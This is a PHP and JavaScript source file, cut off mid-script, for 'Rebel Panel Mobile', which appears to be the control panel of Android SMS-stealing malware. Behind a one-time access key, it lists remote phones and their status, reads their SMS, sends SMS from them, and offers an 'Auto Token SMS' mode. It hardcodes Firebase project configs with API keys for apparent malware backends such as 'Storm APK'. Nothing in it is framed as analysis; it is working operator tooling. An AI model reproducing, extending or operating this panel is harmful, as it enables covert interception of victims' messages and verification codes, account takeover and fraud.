<?php
require_once __DIR__ . '/rebel_bot_lib.php';

if (isset($_GET['rebel_auth']) || isset($_POST['rebel_auth'])) {
  $body = json_decode(file_get_contents('php://input') ?: '{}', true);
  if (!is_array($body)) $body = [];
  $action = strtolower(trim((string)($body['action'] ?? $_REQUEST['action'] ?? 'login')));
  $data = rebel_keys_load();

  if ($action === 'check') {
    $token = trim((string)($body['token'] ?? ''));
    if ($token === '') rebel_json_out(['ok' => false, 'error' => 'No session'], 401);
    $valid = rebel_session_valid($data, $token);
    if (!$valid) {
      rebel_keys_save($data);
      rebel_json_out(['ok' => false, 'error' => 'Session revoked or expired'], 401);
    }
    rebel_keys_save($data);
    rebel_json_out(['ok' => true, 'expires' => (int)$valid['expires']]);
  }

  if ($action === 'logout') {
    $token = trim((string)($body['token'] ?? ''));
    if ($token !== '') {
      $hash = hash('sha256', $token);
      if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
      rebel_keys_save($data);
    }
    rebel_json_out(['ok' => true]);
  }

  $key = rebel_norm_key($body['key'] ?? $_REQUEST['key'] ?? '');
  if ($key === '') rebel_json_out(['ok' => false, 'error' => 'Access key required'], 400);
  $valid = rebel_key_login_allowed($data, $key);
  if (!$valid) {
    rebel_keys_save($data);
    $row = $data['keys'][$key] ?? null;
    if ($row && (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1)) {
      rebel_json_out(['ok' => false, 'error' => 'Key already used'], 403);
    }
    rebel_json_out(['ok' => false, 'error' => 'Invalid or expired key'], 403);
  }
  rebel_consume_key($data, $key);
  $remember = !empty($body['remember']);
  $session = rebel_create_session($data, $key, $remember);
  rebel_keys_save($data);
  rebel_json_out(['ok' => true, 'token' => $session['token'], 'expires' => $session['expires']]);
}

header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
<meta name="theme-color" content="#050508"/>
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
<title>Rebel Panel Mobile</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
:root{
  --bg:#050508;--surface:#0d0d14;--card:#14141f;--border:#2a2a3a;
  --accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;
  --success:#00ff9d;--error:#ff4466;--nav-h:64px;--hdr-h:56px;
  --safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
  --ios-blue:#0a84ff;--ios-purple:#bf5af2;--ios-titanium:#8e8e93;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow:hidden}
body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased}
.app{position:fixed;inset:0;display:flex;flex-direction:column;background:var(--bg)}
.app-bg{position:absolute;inset:0;overflow:hidden;pointer-events:none;z-index:0}
.app-orb{position:absolute;border-radius:50%;filter:blur(70px);opacity:.35;animation:orbDrift 14s ease-in-out infinite}
.app-orb.a{width:280px;height:280px;background:#ff3c3c;top:-8%;left:-12%;animation-delay:0s}
.app-orb.b{width:240px;height:240px;background:#ff9500;bottom:10%;right:-10%;animation-delay:-5s}
.app-orb.c{width:200px;height:200px;background:#7b2fff;top:45%;left:40%;opacity:.2;animation-delay:-9s}
.app>*:not(.app-bg){position:relative;z-index:1}
.hidden{display:none!important}
.mono{font-family:'Space Mono',monospace}
@keyframes orbDrift{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(24px,-20px) scale(1.06)}}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@keyframes slideInRight{from{opacity:0;transform:translateX(28px)}to{opacity:1;transform:none}}
@keyframes slideInLeft{from{opacity:0;transform:translateX(-28px)}to{opacity:1;transform:none}}
@keyframes popIn{0%{opacity:0;transform:scale(.88)}70%{transform:scale(1.02)}100%{opacity:1;transform:scale(1)}}
@keyframes floatPhone{0%,100%{transform:translateY(0) rotate(-1deg)}50%{transform:translateY(-6px) rotate(1deg)}}
@keyframes pulseRing{0%{box-shadow:0 0 0 0 rgba(0,255,157,.45)}70%{box-shadow:0 0 0 10px rgba(0,255,157,0)}100%{box-shadow:0 0 0 0 rgba(0,255,157,0)}}
@keyframes shimmer{0%{background-position:-200% center}100%{background-position:200% center}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes iosGlow{0%,100%{opacity:.55}50%{opacity:1}}
@keyframes bubbleIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:none}}
@keyframes statPop{0%{transform:scale(1)}50%{transform:scale(1.12)}100%{transform:scale(1)}}

/* LOGIN */
.login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t));background:
  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.18),transparent),var(--bg)}
.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5);animation:popIn .55s cubic-bezier(.34,1.4,.64,1) both}
.login-logo{display:flex;align-items:center;gap:12px;margin-bottom:24px}
.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px;animation:iosGlow 2.5s ease-in-out infinite}
.login-logo h1{font-size:22px;font-weight:800}
.login-logo em{color:var(--accent);font-style:normal}
.login-sub{color:var(--muted);font-size:12px;margin:-16px 0 20px}
.key-input{width:100%;padding:16px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:14px;letter-spacing:1px;text-transform:uppercase;outline:none}
.key-input:focus{border-color:var(--accent)}
.login-err{color:var(--error);font-size:12px;margin:10px 0;display:none}
.btn-primary{width:100%;margin-top:16px;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent),#cc2020);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:15px;cursor:pointer;transition:transform .15s ease,box-shadow .15s}
.btn-primary:active{transform:scale(.97)}
.btn-primary:disabled{opacity:0.6}
.remember{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:12px;color:var(--muted)}
.remember input{width:18px;height:18px;accent-color:var(--accent)}

/* HEADER */
.hdr{flex-shrink:0;height:calc(var(--hdr-h) + var(--safe-t));padding-top:var(--safe-t);padding-left:16px;padding-right:16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(12px);background:rgba(5,5,8,0.85);z-index:10}
.hdr-left{display:flex;align-items:center;gap:10px;min-width:0}
.hdr-mark{width:32px;height:32px;border-radius:10px;background:rgba(255,60,60,0.12);border:1px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:14px;flex-shrink:0}
.hdr-title{font-size:15px;font-weight:800;white-space:nowrap}
.hdr-sub{font-size:9px;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:1px}
.hdr-actions{display:flex;gap:8px;flex-shrink:0}
.icon-btn{width:38px;height:38px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:transform .2s}
.icon-btn.spinning span{display:inline-block;animation:spin .7s linear infinite}
.icon-btn:active{transform:scale(.92)}
.fb-chip{max-width:110px;padding:8px 12px;border-radius:100px;border:1px solid rgba(255,149,0,0.3);background:rgba(255,149,0,0.1);color:var(--accent2);font-family:'Space Mono',monospace;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* SCREENS */
.screens{flex:1;overflow:hidden;position:relative}
.screen{position:absolute;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:12px 14px calc(var(--nav-h) + var(--safe-b) + 16px);opacity:0;pointer-events:none;transform:translateX(24px);transition:opacity .32s cubic-bezier(.32,.72,0,1),transform .32s cubic-bezier(.32,.72,0,1)}
.screen.active{opacity:1;pointer-events:auto;transform:none}
.screen.slide-back{transform:translateX(-24px)}

/* STATS */
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.stat-card{padding:12px 10px;border-radius:14px;background:var(--card);border:1px solid var(--border);text-align:center;animation:fadeUp .45s ease both}
.stat-card:nth-child(1){animation-delay:.05s}.stat-card:nth-child(2){animation-delay:.1s}.stat-card:nth-child(3){animation-delay:.15s}
.stat-val{font-size:20px;font-weight:800;font-family:'Space Mono',monospace;transition:transform .3s}
.stat-val.bump{animation:statPop .35s ease}
.stat-val.on{color:var(--success)}.stat-val.off{color:var(--error)}
.stat-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-top:2px}

.search-wrap{margin-bottom:12px}
.search{width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:14px;outline:none}
.search:focus{border-color:var(--accent)}

/* iOS DEVICE LIST */
.dev-list{display:flex;flex-direction:column;gap:14px}
.ios-row{display:flex;align-items:center;gap:14px;padding:12px 14px 12px 10px;border-radius:20px;background:linear-gradient(135deg,rgba(22,22,32,.95),rgba(12,12,18,.98));border:1px solid var(--border);cursor:pointer;transition:transform .2s cubic-bezier(.34,1.2,.64,1),border-color .2s,box-shadow .2s;animation:fadeUp .5s ease both}
.ios-row:active{transform:scale(.97)}
.ios-row.active{border-color:rgba(10,132,255,.55);box-shadow:0 0 28px rgba(10,132,255,.15),inset 0 0 0 1px rgba(10,132,255,.1)}
.ios-row.online.active{border-color:rgba(0,255,157,.4);box-shadow:0 0 28px rgba(0,255,157,.12)}
.ios-row.online .iphone-shell{animation:floatPhone 4s ease-in-out infinite}
.ios-row.online .iphone-shell::after{animation:pulseRing 2.2s ease-out infinite}

/* iPhone frame */
.iphone-shell{position:relative;width:72px;height:148px;flex-shrink:0;border-radius:18px;padding:3px;background:linear-gradient(145deg,#3a3a3c,#1c1c1e 40%,#2c2c2e);box-shadow:inset 0 0 0 1px rgba(255,255,255,.12),0 8px 24px rgba(0,0,0,.45);transition:transform .25s}
.iphone-shell::before{content:'';position:absolute;right:-2px;top:36px;width:2px;height:22px;background:#4a4a4c;border-radius:0 2px 2px 0;box-shadow:0 32px 0 #4a4a4c,0 52px 0 #4a4a4c}
.iphone-shell::after{content:'';position:absolute;inset:-4px;border-radius:22px;pointer-events:none}
.iphone-shell.c-blue .iphone-screen{background:linear-gradient(180deg,#1a3a5c 0%,#0d1f33 50%,#081018 100%)}
.iphone-shell.c-purple .iphone-screen{background:linear-gradient(180deg,#2d1b4e 0%,#1a0f30 50%,#0d0818 100%)}
.iphone-shell.c-titanium .iphone-screen{background:linear-gradient(180deg,#2c2c2e 0%,#1a1a1c 50%,#0f0f10 100%)}
.iphone-shell.c-gold .iphone-screen{background:linear-gradient(180deg,#3d3020 0%,#221a10 50%,#141008 100%)}
.iphone-shell.c-red .iphone-screen{background:linear-gradient(180deg,#4a1515 0%,#2a0a0a 50%,#180505 100%)}
.iphone-screen{position:relative;width:100%;height:100%;border-radius:15px;overflow:hidden;display:flex;flex-direction:column;align-items:center;padding:22px 6px 8px}
.iphone-island{position:absolute;top:8px;left:50%;transform:translateX(-50%);width:36px;height:11px;background:#000;border-radius:20px;z-index:2;box-shadow:0 0 0 1px rgba(255,255,255,.06)}
.iphone-island::after{content:'';position:absolute;right:8px;top:50%;transform:translateY(-50%);width:5px;height:5px;border-radius:50%;background:#1a3a1a;box-shadow:0 0 4px rgba(0,255,100,.4)}
.ios-status-top{width:100%;display:flex;justify-content:space-between;align-items:center;padding:0 4px;font-size:7px;font-weight:700;font-family:-apple-system,sans-serif;color:rgba(255,255,255,.9);margin-bottom:auto}
.ios-status-top .ios-time{font-size:8px;font-weight:800}
.ios-status-icons{display:flex;gap:3px;align-items:center}
.ios-sig{width:12px;height:8px;display:flex;align-items:flex-end;gap:1px}
.ios-sig i{display:block;width:2px;background:#fff;border-radius:1px}
.ios-sig i:nth-child(1){height:3px;opacity:.5}.ios-sig i:nth-child(2){height:5px;opacity:.7}.ios-sig i:nth-child(3){height:7px}
.ios-bat-mini{width:16px;height:8px;border:1px solid rgba(255,255,255,.7);border-radius:2px;position:relative;padding:1px}
.ios-bat-mini::after{content:'';position:absolute;right:-3px;top:2px;width:2px;height:4px;background:rgba(255,255,255,.7);border-radius:0 1px 1px 0}
.ios-bat-mini span{display:block;height:100%;border-radius:1px;background:var(--success)}
.ios-bat-mini.low span{background:var(--error)}
.ios-lock-icon{font-size:18px;margin:8px 0 4px;opacity:.85}
.ios-screen-phone{font-size:9px;font-weight:800;text-align:center;color:#fff;letter-spacing:.3px;line-height:1.3;word-break:break-all;padding:0 2px}
.ios-screen-model{font-size:6px;color:rgba(255,255,255,.45);margin-top:3px;text-align:center;font-family:'Space Mono',monospace}
.ios-home-bar{width:28px;height:3px;border-radius:3px;background:rgba(255,255,255,.35);margin-top:auto;margin-bottom:2px}
.ios-online-pip{position:absolute;bottom:6px;right:6px;width:8px;height:8px;border-radius:50%;background:var(--muted);border:2px solid rgba(0,0,0,.5)}
.ios-row.online .ios-online-pip{background:var(--success);box-shadow:0 0 8px var(--success)}

.ios-info{flex:1;min-width:0}
.ios-info-phone{font-size:16px;font-weight:800;margin-bottom:3px;letter-spacing:-.3px}
.ios-info-model{font-size:11px;color:var(--muted);margin-bottom:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ios-info-model em{color:var(--ios-blue);font-style:normal;font-weight:600}
.ios-chips{display:flex;flex-wrap:wrap;gap:5px}
.chip{font-size:8px;padding:4px 9px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace;background:rgba(0,0,0,.2)}
.chip.bat{color:var(--success);border-color:rgba(0,255,157,0.25)}
.chip.ios{font-size:7px;color:var(--ios-blue);border-color:rgba(10,132,255,.25)}
.empty-state{text-align:center;padding:48px 20px;color:var(--muted);animation:fadeIn .5s ease}
.empty-state .ico{font-size:40px;margin-bottom:12px;opacity:0.5;animation:floatPhone 3s ease-in-out infinite}

/* DEVICE HERO — large iPhone */
.hero-wrap{display:flex;flex-direction:column;align-items:center;animation:popIn .5s cubic-bezier(.34,1.2,.64,1) both}
.hero-iphone{margin:8px 0 20px}
.hero-iphone .iphone-shell{width:180px;height:370px;border-radius:36px;padding:6px}
.hero-iphone .iphone-shell.online{animation:floatPhone 5s ease-in-out infinite}
.hero-iphone .iphone-screen{border-radius:30px;padding:48px 14px 16px}
.hero-iphone .iphone-island{width:72px;height:22px;top:14px;border-radius:20px}
.hero-iphone .ios-status-top{font-size:11px;padding:0 8px}
.hero-iphone .ios-time{font-size:13px}
.hero-iphone .ios-lock-icon{font-size:36px;margin:24px 0 12px}
.hero-iphone .ios-screen-phone{font-size:18px;letter-spacing:.5px}
.hero-iphone .ios-screen-model{font-size:10px;margin-top:8px}
.hero-iphone .ios-home-bar{width:56px;height:5px}
.hero-iphone .ios-bat-mini{width:24px;height:11px}
.hero-iphone .ios-sig i{width:3px}.hero-iphone .ios-sig i:nth-child(1){height:4px}.hero-iphone .ios-sig i:nth-child(2){height:7px}.hero-iphone .ios-sig i:nth-child(3){height:10px}
.hero-stats{width:100%;display:grid;grid-template-columns:repeat(2,1fr);gap:8px;animation:fadeUp .5s .15s ease both}
.hero-cell{padding:12px;border-radius:14px;background:var(--card);border:1px solid var(--border)}
.hero-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-bottom:4px}
.hero-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}
.hero-badge-wrap{text-align:center;margin-bottom:12px;animation:fadeUp .4s .1s ease both}
.hero-badge{display:inline-block;padding:6px 14px;border-radius:100px;font-size:10px;font-weight:800;font-family:'Space Mono',monospace}
.hero-badge.online{background:rgba(0,255,157,0.15);color:var(--success)}
.hero-badge.offline{background:rgba(107,107,136,0.15);color:var(--muted)}
.hero-uid{font-size:8px;color:var(--muted);font-family:'Space Mono',monospace;text-align:center;margin-top:12px;word-break:break-all;animation:fadeIn .5s .2s ease both}

/* SMS CHAT — iMessage style */
.sms-list{display:flex;flex-direction:column;gap:10px;padding-bottom:8px}
.sms-bubble{max-width:88%;padding:11px 14px;border-radius:18px;font-size:14px;line-height:1.45;animation:bubbleIn .35s ease both}
.sms-bubble.in{align-self:flex-start;background:#2c2c2e;border:1px solid rgba(255,255,255,.06);border-bottom-left-radius:4px}
.sms-bubble.out{align-self:flex-end;background:linear-gradient(135deg,#0a84ff,#0066cc);border:none;color:#fff;border-bottom-right-radius:4px}
.sms-from{font-size:10px;font-weight:700;margin-bottom:4px;color:var(--accent2)}
.sms-bubble.out .sms-from{color:rgba(255,255,255,.75)}
.sms-time{font-size:9px;color:var(--muted);margin-top:6px;font-family:'Space Mono',monospace}
.sms-bubble.out .sms-time{color:rgba(255,255,255,.55)}
.sms-badge{display:inline-block;font-size:7px;padding:2px 6px;border-radius:6px;background:rgba(255,60,60,0.2);color:var(--accent);margin-left:6px}

/* SEND FORM */
.form-card{padding:16px;border-radius:18px;background:var(--card);border:1px solid var(--border)}
.form-label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
.form-input,.form-textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:15px;outline:none;margin-bottom:14px}
.form-textarea{min-height:120px;resize:none;font-family:inherit}
.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--success),#00cc7a);color:#050508;font-weight:800;font-size:15px;cursor:pointer}
.send-status{margin-top:10px;font-size:11px;font-family:'Space Mono',monospace;text-align:center}

/* MORE */
.menu-list{display:flex;flex-direction:column;gap:8px}
.menu-item{display:flex;align-items:center;justify-content:space-between;padding:16px;border-radius:14px;background:var(--card);border:1px solid var(--border);cursor:pointer;font-size:14px;font-weight:600}
.menu-item span{color:var(--muted);font-size:12px;font-weight:400}
.menu-item.danger{border-color:rgba(255,68,102,0.3);color:var(--error)}
.toggle{width:44px;height:26px;border-radius:100px;background:var(--border);position:relative;transition:background .2s}
.toggle.on{background:var(--success)}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#fff;transition:transform .2s}
.toggle.on::after{transform:translateX(18px)}
.proto-tag{display:inline-block;padding:4px 10px;border-radius:8px;background:rgba(123,47,255,0.15);color:#b388ff;font-size:9px;font-family:'Space Mono',monospace;margin-bottom:14px}

/* BOTTOM NAV — iOS tab bar */
.bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(12,12,18,.92);border-top:1px solid rgba(255,255,255,0.08);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px;transition:color .2s,transform .2s}
.nav-item .ico{font-size:22px;line-height:1;transition:transform .25s cubic-bezier(.34,1.4,.64,1)}
.nav-item.active{color:var(--ios-blue)}
.nav-item.active .ico{transform:scale(1.15) translateY(-2px);filter:drop-shadow(0 2px 8px rgba(10,132,255,.4))}
.nav-item:active .ico{transform:scale(.9)}

/* SHEET */
.sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:50;opacity:0;pointer-events:none;transition:opacity .25s}
.sheet-bg.open{opacity:1;pointer-events:auto}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:51;background:var(--surface);border-radius:20px 20px 0 0;padding:12px 16px calc(20px + var(--safe-b));max-height:70vh;overflow-y:auto;transform:translateY(100%);transition:transform .28s cubic-bezier(.32,.72,0,1)}
.sheet.open{transform:translateY(0)}
.sheet-handle{width:36px;height:4px;border-radius:4px;background:var(--border);margin:0 auto 16px}
.sheet-title{font-size:13px;font-weight:800;margin-bottom:12px}
.fb-option{display:flex;align-items:center;justify-content:space-between;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer}
.fb-option.active{border-color:var(--accent);background:rgba(255,60,60,0.08)}
.fb-option .cnt{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}

.toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
.toast{padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--border);font-size:12px;margin-bottom:8px;animation:toastIn .3s ease}
.toast.ok{border-color:rgba(0,255,157,0.3)}.toast.err{border-color:rgba(255,68,102,0.3)}
@keyframes toastIn{from{opacity:0;transform:translateY(-10px) scale(.95)}to{opacity:1;transform:none}}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}}
</style>
</head>
<body>

<!-- LOGIN -->
<div class="login-screen" id="loginScreen">
  <div class="login-card">
    <div class="login-logo"><div class="mark">R</div><h1><em>Rebel</em> Mobile</h1></div>
    <p class="login-sub">Phone prototype · same key as desktop panel</p>
    <div class="login-err" id="loginErr"></div>
    <input class="key-input" id="loginKey" placeholder="RBL-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
    <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
    <button class="btn-primary" id="loginBtn" onclick="doLogin()">Unlock Panel</button>
  </div>
</div>

<!-- APP -->
<div class="app hidden" id="appShell">
  <div class="app-bg"><div class="app-orb a"></div><div class="app-orb b"></div><div class="app-orb c"></div></div>
  <header class="hdr">
    <div class="hdr-left">
      <div class="hdr-mark">R</div>
      <div>
        <div class="hdr-title">Rebel Mobile</div>
        <div class="hdr-sub" id="hdrSub">Connecting...</div>
      </div>
    </div>
    <div class="hdr-actions">
      <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
      <button class="icon-btn" id="refreshBtn" onclick="refreshData()" title="Refresh"><span>↻</span></button>
    </div>
  </header>

  <div class="screens">
    <section class="screen active" id="screen-home">
      <div class="stats-row">
        <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
        <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
        <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
      </div>
      <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
      <div class="dev-list" id="devList"></div>
    </section>

    <section class="screen" id="screen-device">
      <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
      <div id="deviceHero" class="hidden"></div>
    </section>

    <section class="screen" id="screen-sms">
      <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
      <div class="sms-list" id="smsList"></div>
    </section>

    <section class="screen" id="screen-send">
      <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
      <div class="form-card hidden" id="sendForm">
        <label class="form-label">To Number</label>
        <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
        <label class="form-label">Message</label>
        <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
        <button class="btn-send" onclick="sendSms()">Send SMS</button>
        <div class="send-status" id="sendStatus"></div>
      </div>
    </section>

    <section class="screen" id="screen-more">
      <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
      <div class="menu-list">
        <div class="menu-item" onclick="openFbSheet()">Firebase Project <span id="moreFbName">—</span></div>
        <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
        <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
        <a class="menu-item" href="sex.php" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
        <div class="menu-item danger" onclick="doLogout()">Logout</div>
      </div>
    </section>
  </div>

  <nav class="bottom-nav">
    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
    <button class="nav-item" data-tab="more" onclick="switchTab('more',this)"><span class="ico">⚙️</span>More</button>
  </nav>
</div>

<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
<div class="sheet" id="fbSheet">
  <div class="sheet-handle"></div>
  <div class="sheet-title">Switch Firebase</div>
  <div id="fbSheetList"></div>
</div>
<div class="toast-wrap" id="toasts"></div>

<script>
var AUTH_URL='phone.php?rebel_auth=1';
var SMS_TOKEN_URL='sex.php?sms_token_api=1';
var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[];
var ACTIVE_FB_KEY='rbl_active_fb_m';
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

var DEFAULT_FIREBASES=[
  {id:'rabel_raand',name:'Rebel',schema:'rabel',apiKey:'AIzaSyB5Fmk4HgxDLmkfSegOW2TBdtJeCpM-nuw',authDomain:'rabel-raand.firebaseapp.com',databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',projectId:'rabel-raand',storageBucket:'rabel-raand.firebasestorage.app',messagingSenderId:'574630053774',appId:'1:574630053774:android:aa7475de67c935821806df'},
  {id:'monster_green_c5e81',name:'Monster Green',schema:'rabel',apiKey:'AIzaSyBspKFI_F7hB-5hHJI0203786vXuCMMbM8',authDomain:'monster-green-c5e81.firebaseapp.com',databaseURL:'https://monster-green-c5e81-default-rtdb.firebaseio.com',projectId:'monster-green-c5e81',storageBucket:'monster-green-c5e81.firebasestorage.app',messagingSenderId:'411242045978',appId:'1:411242045978:android:1748043e0e030b348067a3'},
  {id:'pmfg_ccccc',name:'PMFG',schema:'spinplay',apiKey:'AIzaSyBq_UQz4RtTsomqsWLA99ilqvrK14Okh9w',authDomain:'pmfg-ccccc.firebaseapp.com',databaseURL:'https://pmfg-ccccc-default-rtdb.firebaseio.com',projectId:'pmfg-ccccc'},
  {id:'spinplay99',name:'SpinPlay99',schema:'spinplay',apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',authDomain:'spinplay99.firebaseapp.com',databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'spinplay99',storageBucket:'spinplay99.firebasestorage.app',messagingSenderId:'8121733414',appId:'1:8121733414:web:04b9ae5df1b6bc413e31e7'},
  {id:'nsx1_7f7aa',name:'NSX1',schema:'rabel',apiKey:'AIzaSyBnfbREOJVIVrN2K7KJX4TTPbKcMIFasDQ',authDomain:'nsx1-7f7aa.firebaseapp.com',databaseURL:'https://nsx1-7f7aa-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'nsx1-7f7aa',storageBucket:'nsx1-7f7aa.firebasestorage.app',messagingSenderId:'1025305009086',appId:'1:1025305009086:android:b3c3d28d5f6bf44f2b77ef'},
  {id:'stormapk_9edea',name:'Storm APK',schema:'rabel',apiKey:'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',authDomain:'stormapk-9edea.firebaseapp.com',databaseURL:'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'stormapk-9edea',storageBucket:'stormapk-9edea.firebasestorage.app',messagingSenderId:'353810391693',appId:'1:353810391693:android:291dcbff91823c3866f8c4'}
];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  try{
    var s=localStorage.getItem('rbl_firebase_list');
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
